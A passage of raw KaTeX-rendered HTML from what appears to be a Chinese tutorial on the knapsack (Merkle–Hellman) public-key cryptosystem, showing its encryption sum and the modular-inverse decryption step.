class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span></span></span></span></span></p><ul><li>我们将这个式子与上面我们更熟悉的未知量代换</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>w</mi><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo>=</mo><mi>w</mi><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mspace linebreak="newline"></mspace><mtext>即</mtext><mi>c</mi><mo>=</mo><mi>w</mi><msub><mi>a</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><mi>w</mi><msub><mi>a</mi><mn>2</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mi>w</mi><msub><mi>a</mi><mn>3</mn></msub><msub><mi>v</mi><mn>3</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">c=\sum_{i=1}^{n}wa_iv_i~mod~m=w\sum_{i=1}^{n}a_iv_i~mod~ m\\即c = wa_1v_1+wa_2v_2+...+wa_3v_3~mod~m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">即</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span></span></span></span></span></p></li><li><p><strong>解密过程</strong>：</p><ul><li>首先要计算w关于m的逆元<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>w</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">w^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，然后通过如下的式子可以得到</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>w</mi><msup><mi>w</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msup><mi>w</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><msub><mi>b</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo>=</mo><mi>c</mi><msup><mi>w</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>&gt;</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{n}a_iv_i~mod~m=\sum_{i=1}^{n}ww^{-1}a_iv_i~mod~m=\sum_{i=1}^{n}w^{-1}b_iv_i~mod~m=cw^{-1}~mod~m\\m&gt;\sum_{i=1}^{n}a_i\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span></span></span></span></p><ul><li>由于m是大于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的和，所以我们解密后<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{n}a_iv_i=\sum_{i=1}^{n}a_iv_i~mod~m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 